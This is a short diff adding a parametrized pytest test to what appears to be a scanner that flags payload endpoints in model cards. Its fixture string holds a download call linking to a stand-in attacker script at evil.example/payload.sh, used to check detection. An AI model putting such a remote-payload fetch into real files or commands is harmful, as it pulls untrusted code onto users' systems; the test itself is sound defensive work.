@@ -2327,6 +2327,15 @@ def test_text_scanner_incomplete_fence_preserves_open_call(tmp_path: Path, fence
 
 
 @pytest.mark.parametrize("fence", ["```", "~~~", "````"])
+@pytest.mark.parametrize("quote", ["", '"""'])
+def test_text_scanner_fence_in_open_call_literal_remains_actionable(tmp_path: Path, fence: str, quote: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path,
+        f"download({quote}\n{fence}text\nexample\n{fence}\n[payload](https://evil.example/payload.sh)\n{quote})\n",
+    )
+
+
+@pytest.mark.parametrize("fence", ["```", "~~~", "````"])
 @pytest.mark.parametrize("example", ['download(\n    "local"\n)\n', "download(\n"])
 def test_text_scanner_closed_fence_does_not_extend_call_into_prose(tmp_path: Path, fence: str, example: str) -> None:
     _assert_model_card_endpoint_informational(
